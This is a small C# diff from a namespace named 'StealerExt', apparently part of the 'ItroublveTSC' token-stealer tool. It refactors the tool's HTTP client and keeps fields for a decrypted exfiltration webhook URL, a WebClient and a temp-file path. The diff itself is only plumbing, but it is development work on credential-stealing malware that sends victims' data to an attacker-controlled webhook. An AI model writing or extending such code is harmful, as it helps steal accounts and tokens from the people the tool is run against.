@@ -9,6 +9,7 @@ namespace StealerExt
 	{
 		public API(string _HookUrl)
 		{
+			_Client = new HttpUtils();
 			_URL = _HookUrl;
 		}
         public static void History()
@@ -142,10 +143,8 @@ namespace StealerExt
 		public static string wHook => Hook._DecryptedHook;
 		public const string name = "ItroublveTSC 6.2";
 		public const string pfp = "https://encrypted-tbn0.gstatic.com/images?q=tbn:ANd9GcQaZLjMqLWHlL0VMxjLOEYXohyV6C9dsEjKsg&usqp=CAU";
-		private HttpClient _Client;
+		private readonly HttpUtils _Client;
 		private readonly string _URL;
-		//public string _name { get; set; }
-		//public string _ppUrl { get; set; }
 		public static WebClient wc = new WebClient();
 		public static string Temp = Path.GetTempPath();
 	}
